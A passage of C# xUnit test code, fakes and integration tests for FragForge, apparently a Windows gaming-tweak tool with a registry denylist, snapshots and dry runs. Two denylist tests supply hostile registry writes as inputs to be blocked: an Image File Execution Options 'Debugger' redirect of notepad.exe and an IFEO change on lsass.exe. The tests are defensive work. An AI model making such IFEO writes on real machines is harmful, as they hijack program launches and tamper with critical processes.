    }

    [Fact]
    public async Task Denylist_BlocksDebuggerValueName()
    {
        var registry = new FakeRegistry();
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe", "Debugger", "String", "calc.exe")));
    }

    [Fact]
    public async Task Denylist_BlocksCriticalIfeoImages()
    {
        var registry = new FakeRegistry();
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions", "CpuPriorityClass", "DWord", 1)));
    }

    [Fact]
    public void MissingUserSid_FailsForUserHive()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        Assert.Throws<InvalidOperationException>(() => RegistryPath.ResolveUserHive(HkcuKey, null));
    }

    [Fact]
    public async Task DryRun_DescribesWithoutWriting()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Value", "DWord", 3);
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        var context = Context();
        var before = await action.CaptureAsync(context);
        var description = await action.DryRunAsync(context);
        Assert.Contains("3", description, StringComparison.Ordinal);
        Assert.Equal(3, registry.GetInt(Key, "Value"));
        Assert.Empty(registry.Writes);
        _ = before;
    }
}
````

### `tests/FragForge.Tests/Fakes/FakeHardwareProfiler.cs`  <sub>(47 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Tests.Fakes;

public sealed class FakeHardwareProfiler : IHardwareProfiler
{
    public HardwareProfile Profile { get; set; } = TestProfiles.Pn64();
    public Task<HardwareProfile> ProfileAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null) => Task.FromResult(Profile);
}
public static class TestProfiles
{
    public static HardwareProfile Pn64() => new()
    {
        MachineName = "PN64-TEST",
        InteractiveUserName = "PN64\\ZuKA",
        InteractiveUserSid = "S-1-5-21-1111111111-2222222222-3333333333-1001",
        ProcessUserSid = "S-1-5-21-1111111111-2222222222-3333333333-1001",
        Os = new OsInfo { Name = "Microsoft Windows 11 Pro", Edition = "Microsoft Windows 11 Pro", Version = "10.0.26200", Build = 26200, Ubr = 6725, Architecture = "X64", Culture = "es-MX", TimeZone = "Argentina Standard Time" },
        Cpu = new CpuInfo { Model = "12th Gen Intel(R) Core(TM) i3-1220P", Vendor = "Intel", PhysicalCores = 10, LogicalProcessors = 12, PCores = 2, ECores = 8, IsHybrid = true, TopologySource = "EfficiencyClass", FirmwareVirtualizationEnabled = false, BaseClockMhz = 1500 },
        Memory = new MemoryInfo
        {
            TotalBytes = 16UL * 1024 * 1024 * 1024, Channels = MemoryChannelState.Dual, ConfiguredSpeedMtPerSecond = 3200,
            Modules = [new MemoryModuleInfo { BankLabel = "BANK 0", DeviceLocator = "Controller0-ChannelA", CapacityBytes = 8UL * 1024 * 1024 * 1024, SpeedMtPerSecond = 3200, ConfiguredSpeedMtPerSecond = 3200 }, new MemoryModuleInfo { BankLabel = "BANK 2", DeviceLocator = "Controller0-ChannelB", CapacityBytes = 8UL * 1024 * 1024 * 1024, SpeedMtPerSecond = 3200, ConfiguredSpeedMtPerSecond = 3200 }]
        },
        Gpus = [new GpuInfo { Name = "Intel(R) UHD Graphics", Vendor = GpuVendor.Intel, IsIntegrated = true, DriverVersion = "32.0.101.6129" }],
        Disks = [new DiskInfo { Model = "KINGSTON SA400S37480G", Kind = DiskKind.Ssd, Bus = "SATA", Health = "Healthy", SmartPredictFailure = false, SizeBytes = 480103981056 }],
        NetworkAdapters = [new NetworkAdapterInfo { Name = "Ethernet", Description = "Intel(R) Ethernet Controller I225-V", Kind = NetworkKind.Ethernet, IsPhysical = true, LinkSpeedBitsPerSecond = 1_000_000_000, State = "Connected" }, new NetworkAdapterInfo { Name = "Wi-Fi", Description = "Intel(R) Wi-Fi 6E AX210 160MHz", Kind = NetworkKind.WiFi, IsPhysical = true, LinkSpeedBitsPerSecond = 2_400_000_000, State = "Disconnected" }],
        Monitors = [new MonitorInfo { Name = "Generic PnP Monitor", Width = 1920, Height = 1080, RefreshRateHz = 144, Source = "Win32_VideoController" }],
        Security = new SecurityInfo { Vbs = FeatureState.Disabled, Hvci = FeatureState.Disabled, SecureBoot = FeatureState.Enabled, Tpm = FeatureState.Enabled, TpmVersion = "2.0", Hags = FeatureState.Disabled, Mpo = FeatureState.Disabled },
        Power = new PowerInfo { ActiveSchemeGuid = "381b4222-f694-41f0-9685-ff5bb260df2e", ActiveSchemeName = "Balanced", Pl1Watts = 28, Pl2Watts = 64 },
        FormFactor = new FormFactorInfo { IsPortable = false, HasBattery = false, ChassisTypes = ["MiniPC"], SystemModel = "MINIPC PN64", BiosVersion = "3.12.00" },
        Playbooks = [new PlaybookDetection("Atlas Playbook (heurística)", "Low", ["Servicios no corriendo (no concluyente): SysMain,WSearch,Spooler,DiagTrack"])],
        DeviceErrors = [new DeviceErrorInfo("PawnIO", @"ROOT\PAWNIO\0000", 0, "PawnIO"), new DeviceErrorInfo("(sin nombre)", @"USB\VID_0000&PID_0000\5&1", 28, null)],
        Games = new GameInfo { Cs2ExecutablePath = @"C:\Program Files (x86)\Steam\steamapps\common\Counter-Strike Global Offensive\game\bin\win64\cs2.exe", Cs2DetectionSource = "Steam registry" },
        Maintenance = new SystemMaintenanceInfo { IsAdministrator = true, PendingReboot = false, WindowsServicingActive = false, SystemProtection = FeatureState.Enabled, SystemDriveFreeBytes = 120UL * 1024 * 1024 * 1024 },
        Observations = [new DiagnosticObservation("hags", "Disabled", "Registry HwSchMode", "High")]
    };
    public static HardwareProfile NonWindows() => new() { IsUnsupportedPlatform = true, Os = new OsInfo { Build = 0, Architecture = "X64" }, Cpu = new CpuInfo { IsHybrid = null }, Maintenance = new SystemMaintenanceInfo { IsAdministrator = false, SystemProtection = FeatureState.Unknown } };
    public static HardwareProfile Windows10() => Pn64() with { Os = Pn64().Os with { Build = 19045 } };
    public static HardwareProfile GpuOnlyDiscrete() => Pn64() with { Gpus = [new GpuInfo { Name = "NVIDIA GeForce RTX 4060", Vendor = GpuVendor.Nvidia }] };
    public static HardwareProfile SingleChannel() => Pn64() with { Memory = Pn64().Memory with { Channels = MemoryChannelState.Single, Modules = [Pn64().Memory.Modules[0]] } };
    public static HardwareProfile NoCs2() => Pn64() with { Games = new GameInfo { Cs2DetectionSource = "Not detected" } };
    public static HardwareProfile PendingReboot() => Pn64() with { Maintenance = Pn64().Maintenance with { PendingReboot = true, PendingRebootReasons = ["CBS RebootPending"] } };
    public static HardwareProfile NoAdmin() => Pn64() with { Maintenance = Pn64().Maintenance with { IsAdministrator = false } };
    public static HardwareProfile NoProtection() => Pn64() with { Maintenance = Pn64().Maintenance with { SystemProtection = FeatureState.Disabled } };
}
````

### `tests/FragForge.Tests/Fakes/FakePlatformServices.cs`  <sub>(96 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Tests.Fakes;

public sealed class FakeSystemRestoreService : ISystemRestoreService
{
    public FeatureState Protection { get; set; } = FeatureState.Enabled;
    public int CreateCalls { get; private set; }
    public int EnableCalls { get; private set; }
    public bool FailCreate { get; set; }
    public Task<FeatureState> GetProtectionStateAsync(CancellationToken cancellationToken = default) => Task.FromResult(Protection);
    public Task EnableProtectionAsync(CancellationToken cancellationToken = default) { EnableCalls++; Protection = FeatureState.Enabled; return Task.CompletedTask; }
    public Task<RestorePointResult> CreateAsync(string description, CancellationToken cancellationToken = default)
    {
        CreateCalls++;
        if (FailCreate) throw new InvalidOperationException("Restore point failed (fake).");
        return Task.FromResult(new RestorePointResult(42, "Punto creado (fake)."));
    }
}
public sealed class FakeServiceController : IServiceController
{
    public Dictionary<string, ServiceCapture> Services { get; } = new(StringComparer.OrdinalIgnoreCase);
    public List<(string Name, string StartMode, bool? Delayed, bool RestoreAbsentDelayed)> StartModeCalls { get; } = [];
    public List<(string Name, string State)> StateCalls { get; } = [];
    public Task<ServiceCapture> GetAsync(string name, CancellationToken cancellationToken = default) => Task.FromResult(Services.TryGetValue(name, out var service) ? service : new ServiceCapture { Name = name, Exists = false });
    public Task SetStartModeAsync(string name, string startMode, bool? delayedAutoStart, CancellationToken cancellationToken = default, bool restoreAbsentDelayed = false)
    {
        StartModeCalls.Add((name, startMode, delayedAutoStart, restoreAbsentDelayed));
        var current = Services.TryGetValue(name, out var service) ? service : new ServiceCapture { Name = name, Exists = false };
        Services[name] = restoreAbsentDelayed
            ? current with { Exists = true, StartMode = startMode, DelayedAutoStart = false, DelayedAutoStartExisted = false }
            : current with { Exists = true, StartMode = startMode, DelayedAutoStart = delayedAutoStart ?? current.DelayedAutoStart ?? false, DelayedAutoStartExisted = true };
        return Task.CompletedTask;
    }
    public Task SetStateAsync(string name, string state, CancellationToken cancellationToken = default)
    {
        StateCalls.Add((name, state));
        var current = Services.TryGetValue(name, out var service) ? service : new ServiceCapture { Name = name, Exists = false };
        Services[name] = current with { Exists = true, State = state };
        return Task.CompletedTask;
    }
}
public sealed class FakeScheduledTaskStore : IScheduledTaskStore
{
    public Dictionary<string, ScheduledTaskActionState> Tasks { get; } = new(StringComparer.OrdinalIgnoreCase);
    public List<(string Path, bool Enabled)> Calls { get; } = [];
    public Task<ScheduledTaskActionState> GetAsync(string path, CancellationToken cancellationToken = default) => Task.FromResult(Tasks.TryGetValue(path, out var task) ? task : new ScheduledTaskActionState { Path = path, Exists = false, Enabled = false });
    public Task SetEnabledAsync(string path, bool enabled, CancellationToken cancellationToken = default)
    {
        Calls.Add((path, enabled));
        var current = Tasks.TryGetValue(path, out var task) ? task : new ScheduledTaskActionState { Path = path, Exists = false, Enabled = false };
        Tasks[path] = current with { Exists = true, Enabled = enabled };
        return Task.CompletedTask;
    }
}
public sealed class FakeNetworkAdapterController : INetworkAdapterController
{
    public Dictionary<(string Adapter, string Keyword), NetworkPropertyCapture> Properties { get; } = new();
    public List<(string Adapter, string Keyword, IReadOnlyList<string> Value)> Calls { get; } = [];
    public Task<NetworkPropertyCapture> GetAsync(string adapterName, string keyword, CancellationToken cancellationToken = default) => Task.FromResult(Properties.TryGetValue((adapterName, keyword), out var capture) ? capture : new NetworkPropertyCapture { AdapterName = adapterName, Keyword = keyword, Exists = false });
    public Task SetAsync(string adapterName, string keyword, IReadOnlyList<string> value, CancellationToken cancellationToken = default)
    {
        Calls.Add((adapterName, keyword, value));
        var current = Properties.TryGetValue((adapterName, keyword), out var capture) ? capture : new NetworkPropertyCapture { AdapterName = adapterName, Keyword = keyword, Exists = false };
        Properties[(adapterName, keyword)] = current with { Exists = true, RegistryValue = value };
        return Task.CompletedTask;
    }
}
public sealed class FakeGameLocator : IGameLocator
{
    public GameInfo Info { get; set; } = TestProfiles.Pn64().Games;
    public Task<GameInfo> LocateCs2Async(CancellationToken cancellationToken = default) => Task.FromResult(Info);
}
public sealed class FakeWmiQuery : IWmiQuery
{
    public Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>> QueryAsync(string scope, string className, IReadOnlyList<string> properties, string? where = null, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<IReadOnlyDictionary<string, object?>>>([]);
}
public sealed class FakeConditionFactoryProbe : ITweakConditionFactory
{
    private readonly FragForge.Core.Conditions.ConditionFactory _inner = new();
    public IReadOnlySet<string> SupportedTypes => _inner.SupportedTypes;
    public ITweakCondition Create(ConditionSpec specification) => _inner.Create(specification);
}
public sealed class FakeJournal : IJournal
{
    public List<JournalEntry> Entries { get; } = [];
    public bool Corrupt { get; set; }
    public Task AppendAsync(JournalEntry entry, CancellationToken cancellationToken = default) { Entries.Add(entry with { Hash = entry.Hash.Length == 0 ? Guid.NewGuid().ToString("N") : entry.Hash }); return Task.CompletedTask; }
    public Task<IReadOnlyList<JournalEntry>> ReadAllAsync(CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<JournalEntry>>(Entries.ToArray());
    public Task<JournalIntegrity> VerifyIntegrityAsync(CancellationToken cancellationToken = default) => Task.FromResult(Corrupt ? new JournalIntegrity(false, Entries.Count, "Cadena rota (fake).") : new JournalIntegrity(true, Entries.Count, null));
}
public sealed class FakeClock
{
    public DateTimeOffset Now { get; set; } = new(2026, 11, 13, 12, 0, 0, TimeSpan.Zero);
}
````

### `tests/FragForge.Tests/Fakes/FakeProcessRunner.cs`  <sub>(16 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Tests.Fakes;

public sealed class FakeProcessRunner : IProcessRunner
{
    public List<ProcessRequest> Requests { get; } = [];
    public Func<ProcessRequest, ProcessResult>? Handler { get; set; }
    public Task<ProcessResult> RunAsync(ProcessRequest request, CancellationToken cancellationToken = default)
    {
        Requests.Add(request);
        cancellationToken.ThrowIfCancellationRequested();
        return Task.FromResult(Handler?.Invoke(request) ?? new ProcessResult(0, "", "", false));
    }
    public int CountContaining(string argument) => Requests.Count(r => r.Arguments.Any(a => a.Contains(argument, StringComparison.OrdinalIgnoreCase)));
}
````

### `tests/FragForge.Tests/Fakes/FakeRegistry.cs`  <sub>(62 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Tests.Fakes;

public sealed class FakeRegistry : IRegistry
{
    public Dictionary<string, Dictionary<string, (string Kind, object Data)>> Keys { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Dictionary<string, int> Writes { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Dictionary<string, int> Deletes { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Dictionary<string, int> ReadCount { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Action<string, string>? BeforeWrite { get; set; }
    public bool ThrowOnRead { get; set; }
    private static string Normalize(string key) => key.Trim().TrimEnd('\\');
    private static string Path(string key, string name) => Normalize(key) + "::" + name;
    public Task<bool> KeyExistsAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult(Keys.ContainsKey(Normalize(key)));
    public Task<RegistryReadResult> ReadValueAsync(string key, string name, CancellationToken cancellationToken = default)
    {
        if (ThrowOnRead) throw new IOException("Fake registry read failure.");
        var canonical = Normalize(key);
        ReadCount[Path(canonical, name)] = ReadCount.GetValueOrDefault(Path(canonical, name)) + 1;
        if (!Keys.TryGetValue(canonical, out var values)) return Task.FromResult(new RegistryReadResult(false, false, null, null));
        return Task.FromResult(values.TryGetValue(name, out var value) ? new RegistryReadResult(true, true, value.Kind, value.Data) : new RegistryReadResult(true, false, null, null));
    }
    public Task<IReadOnlyList<string>> GetValueNamesAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<string>>(Keys.TryGetValue(Normalize(key), out var values) ? values.Keys.ToArray() : []);
    public Task<IReadOnlyList<string>> GetSubKeyNamesAsync(string key, CancellationToken cancellationToken = default)
    {
        var canonical = Normalize(key) + "\\";
        return Task.FromResult<IReadOnlyList<string>>(Keys.Keys.Where(k => k.StartsWith(canonical, StringComparison.OrdinalIgnoreCase) && !k[canonical.Length..].Contains('\\')).Select(k => k[canonical.Length..]).ToArray());
    }
    public Task WriteValueAsync(string key, string name, RegistryWriteValue value, CancellationToken cancellationToken = default)
    {
        BeforeWrite?.Invoke(key, name);
        var canonical = Normalize(key);
        if (!Keys.TryGetValue(canonical, out var values)) { values = new Dictionary<string, (string, object)>(StringComparer.OrdinalIgnoreCase); Keys[canonical] = values; }
        values[name] = (value.Kind, value.Data);
        var path = Path(canonical, name);
        Writes[path] = Writes.GetValueOrDefault(path) + 1;
        return Task.CompletedTask;
    }
    public Task DeleteValueAsync(string key, string name, CancellationToken cancellationToken = default)
    {
        var canonical = Normalize(key);
        if (Keys.TryGetValue(canonical, out var values)) values.Remove(name);
        var path = Path(canonical, name);
        Deletes[path] = Deletes.GetValueOrDefault(path) + 1;
        return Task.CompletedTask;
    }
    public Task DeleteEmptySubKeyAsync(string parentKey, string childName, CancellationToken cancellationToken = default)
    {
        var child = Normalize(parentKey) + "\\" + childName;
        if (Keys.TryGetValue(child, out var values) && values.Count == 0) Keys.Remove(child);
        return Task.CompletedTask;
    }
    public void Set(string key, string name, string kind, object data)
    {
        var canonical = Normalize(key);
        if (!Keys.TryGetValue(canonical, out var values)) { values = new Dictionary<string, (string, object)>(StringComparer.OrdinalIgnoreCase); Keys[canonical] = values; }
        values[name] = (kind, data);
    }
    public string? GetString(string key, string name) => Keys.TryGetValue(Normalize(key), out var values) && values.TryGetValue(name, out var value) ? value.Data as string : null;
    public int? GetInt(string key, string name) => Keys.TryGetValue(Normalize(key), out var values) && values.TryGetValue(name, out var value) ? value.Data as int? : null;
}
````

### `tests/FragForge.Tests/Fakes/TestSupport.cs`  <sub>(116 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Tests.Fakes;

public static class Spec
{
    public static ActionSpec Action(string kind, object? parameters = null) => new() { Kind = kind, Parameters = parameters is null ? default : JsonSerializer.SerializeToElement(parameters, JsonDefaults.Options) };
    public static ConditionSpec Condition(string type, object? parameters = null) => new() { Type = type, Parameters = parameters is null ? default : JsonSerializer.SerializeToElement(parameters, JsonDefaults.Options) };
    public static object Registry(params object[] values) => new { values };
    public static object Value(string key, string name, string kind, object value, string mode = "Set") => new { key, name, kind, value, mode };
}

public static class Tweak
{
    public static TweakDefinition Create(string id, ActionSpec action, RiskLevel risk = RiskLevel.Safe, EvidenceLevel evidence = EvidenceLevel.High, IReadOnlyList<ConditionSpec>? conditions = null, IReadOnlyList<string>? dependsOn = null, IReadOnlyList<string>? conflictsWith = null, IReadOnlyList<string>? tags = null, bool requiresReboot = false, bool requiresAdmin = true) => new()
    {
        Id = id,
        Category = "Latency",
        Title = new LocalizedText { EsMx = "Prueba " + id, EnUs = "Test " + id },
        Description = new LocalizedText { EsMx = "Descripción " + id, EnUs = "Description " + id },
        Evidence = evidence,
        Risk = risk,
        RequiresReboot = requiresReboot,
        RequiresAdmin = requiresAdmin,
        Conditions = conditions ?? [],
        Actions = [action],
        Tags = tags ?? [],
        ConflictsWith = conflictsWith ?? [],
        DependsOn = dependsOn ?? [],
        ExpectedImpact = new ExpectedImpact(),
        References = ["https://example.invalid/test"],
        Notes = new LocalizedText { EsMx = "Notas", EnUs = "Notes" },
        WhenNotToApply = new LocalizedText { EsMx = "No aplicar", EnUs = "Do not apply" }
    };
}

public sealed record ScriptedActionOptions
{
    public bool FailApply { get; init; }
    public bool FailVerify { get; init; }
    public bool FailRevert { get; init; }
    public Action<string>? OnRevert { get; init; }
}

public sealed class ScriptedAction(ScriptedActionOptions options, List<string> trace, string label) : ITweakAction
{
    private bool _applied;
    public string Kind => "Fake";
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.CompletedTask;
    public Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult<ActionState>(new InspectionActionState());
    public Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        trace.Add("apply:" + label);
        if (options.FailApply) throw new VerificationFailedException("apply failed (fake)");
        _applied = true;
        return Task.CompletedTask;
    }
    public Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        trace.Add("verify:" + label);
        if (options.FailVerify) return Task.FromResult(VerificationResult.Missing("verify failed (fake)"));
        return Task.FromResult(_applied ? VerificationResult.Match("ok (fake)") : VerificationResult.Missing("not applied yet (fake)"));
    }
    public Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        trace.Add("revert:" + label);
        options.OnRevert?.Invoke(label);
        if (options.FailRevert) throw new InvalidOperationException("revert failed (fake)");
        _applied = false;
        return Task.CompletedTask;
    }
    public Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult(VerificationResult.Match("reverted (fake)"));
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult("fake dry-run: " + label);
}

public sealed class FakeActionFactory(IRegistry registry, IProtectionPolicy policy, Dictionary<string, ScriptedActionOptions>? scripts = null) : ITweakActionFactory
{
    public List<string> Trace { get; } = [];
    public IReadOnlySet<string> SupportedKinds { get; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "Registry", "Fake" };
    public ITweakAction Create(ActionSpec specification)
    {
        if (specification.Kind.Equals("Registry", StringComparison.OrdinalIgnoreCase)) return new FragForge.Actions.Registry.RegistryAction(registry, policy, specification);
        var id = specification.Parameters.ValueKind == JsonValueKind.Undefined ? "fake" : specification.Parameters.GetProperty("id").GetString() ?? "fake";
        var options = scripts is not null && scripts.TryGetValue(id, out var scripted) ? scripted : new ScriptedActionOptions();
        return new ScriptedAction(options, Trace, id);
    }
}

public sealed class NullExperimentHook : IExperimentHook
{
    public int Order => 0;
    public Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext context, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<ExperimentArtifact>>([]);
}

public sealed class ThrowingExperimentHook : IExperimentHook
{
    public int Order => 0;
    public Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext context, CancellationToken cancellationToken = default) => throw new InvalidOperationException("hook failed (fake)");
}

public sealed class TempDirectory : IDisposable
{
    public string Path { get; }
    public TempDirectory()
    {
        Path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "fragforge-tests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path);
    }
    public void Dispose()
    {
        try { if (Directory.Exists(Path)) Directory.Delete(Path, true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
    }
}
````

### `tests/FragForge.Tests/FragForge.Tests.csproj`  <sub>(15 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <IsPackable>false</IsPackable>
    <IsTestProject>true</IsTestProject>
  </PropertyGroup>
  <ItemGroup>
    <ProjectReference Include="../../src/FragForge.Core/FragForge.Core.csproj" />
    <ProjectReference Include="../../src/FragForge.Actions/FragForge.Actions.csproj" />
    <ProjectReference Include="../../src/FragForge.Tweaks/FragForge.Tweaks.csproj" />
    <ProjectReference Include="../../src/FragForge.Composition/FragForge.Composition.csproj" />
    <PackageReference Include="Microsoft.NET.Test.Sdk" />
    <PackageReference Include="xunit" />
    <PackageReference Include="xunit.runner.visualstudio"><PrivateAssets>all</PrivateAssets></PackageReference>
  </ItemGroup>
</Project>
````

### `tests/FragForge.Tests/Integration/CompositionIntegrationTests.cs`  <sub>(97 líneas)</sub>

````csharp
using FragForge.Composition;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Tests.Fakes;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Xunit;

namespace FragForge.Tests.Integration;

public sealed class CompositionIntegrationTests
{
    private static ShellOptions Options(string dataRoot) => new(dataRoot, "es-MX", ConsoleLogging: false);

    [Fact]
    public async Task CompositionRoot_ResolvesEveryService_AndLoadsTheEmbeddedCatalog()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var catalog = host.Services.GetRequiredService<ITweakCatalog>();
        Assert.Equal(10, catalog.Definitions.Count);
        Assert.NotNull(host.Services.GetRequiredService<ITweakEngine>());
        Assert.NotNull(host.Services.GetRequiredService<IHardwareProfiler>());
        Assert.NotNull(host.Services.GetRequiredService<IReportService>());
        Assert.NotNull(host.Services.GetRequiredService<IJournal>());
        Assert.NotNull(host.Services.GetRequiredService<ISnapshotStore>());
        Assert.NotNull(host.Services.GetRequiredService<IProtectionPolicy>());
        Assert.NotNull(host.Services.GetRequiredService<ITweakActionFactory>());
        Assert.NotNull(host.Services.GetRequiredService<FragForge.Core.Localization.Localizer>());
        Assert.NotNull(host.Services.GetRequiredService<IExecutionGate>());
    }

    [Fact]
    public async Task ScanAndDryRun_WorkOnAnyPlatform_BecauseEverythingIsFakedOrGuarded()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var engine = host.Services.GetRequiredService<ITweakEngine>();
        var scan = await engine.ScanAsync();
        Assert.Equal(10, scan.Tweaks.Count);
        if (!OperatingSystem.IsWindows()) Assert.True(scan.Hardware.IsUnsupportedPlatform);
        var report = await engine.ApplyAsync(scan.Tweaks.Select(t => t.Id), new ApplyOptions { DryRun = true, Profile = TweakProfile.Advanced, CreateRestorePoint = true, TargetUserSid = "S-1-5-21-1-2-3-1001" });
        Assert.True(report.DryRun);
        Assert.Null(report.SnapshotId);
    }

    [Fact]
    public async Task Report_IsGeneratedAsJsonAndHtml_WithAllSections()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var reports = host.Services.GetRequiredService<IReportService>();
        var json = Path.Combine(directory.Path, "reports", "report.json");
        var html = Path.Combine(directory.Path, "reports", "report.html");
        await reports.ExportAsync(json, "json");
        await reports.ExportAsync(html, "html");
        Assert.True(File.Exists(json));
        Assert.True(File.Exists(html));
        var jsonText = await File.ReadAllTextAsync(json);
        Assert.Contains("\"hardware\"", jsonText, StringComparison.Ordinal);
        Assert.Contains("\"tweaks\"", jsonText, StringComparison.Ordinal);
        Assert.Contains("\"preflight\"", jsonText, StringComparison.Ordinal);
        Assert.Contains("\"journalIntegrity\"", jsonText, StringComparison.Ordinal);
        var htmlText = await File.ReadAllTextAsync(html);
        Assert.Contains("<html", htmlText, StringComparison.Ordinal);
        Assert.Contains("FragForge", htmlText, StringComparison.Ordinal);
        Assert.Contains("Journal:", htmlText, StringComparison.Ordinal);
    }

    [Fact]
    public async Task PersonalDenylist_IsMergedFromProgramData()
    {
        using var directory = new TempDirectory();
        var policyPath = Path.Combine(directory.Path, "policy", "denylist.json");
        Directory.CreateDirectory(Path.GetDirectoryName(policyPath)!);
        await File.WriteAllTextAsync(policyPath, """{"schemaVersion":1,"services":["DiagTrack"],"registryKeyPrefixes":["HKLM\\SOFTWARE\\Policies\\Example"],"registryValueNames":[],"taskPrefixes":[],"bcdDenyElements":[],"bcdAllowedElements":["disabledynamictick"],"filePrefixes":[],"networkPropertyKeywords":[],"powerShellDeniedTokens":[]}""");
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var policy = host.Services.GetRequiredService<IProtectionPolicy>();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("DiagTrack"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureRegistryAllowed(@"HKLM\SOFTWARE\Policies\Example\X", "Y"));
    }

    [Fact]
    public async Task SnapshotStoreAndJournal_PersistUnderTheConfiguredDataRoot()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var engine = host.Services.GetRequiredService<ITweakEngine>();
        var snapshots = host.Services.GetRequiredService<ISnapshotStore>();
        Assert.StartsWith(directory.Path, snapshots.RootPath, StringComparison.Ordinal);
        var report = await engine.ApplyAsync(["diagnostics.system-inspect"], new ApplyOptions { DryRun = true, Profile = TweakProfile.Advanced });
        Assert.True(report.Success, string.Join(" ", report.Errors));
        Assert.True(Directory.Exists(Path.Combine(directory.Path, "journal")));
        var journal = host.Services.GetRequiredService<IJournal>();
        Assert.True((await journal.ReadAllAsync()).Count > 0);
    }
}
````

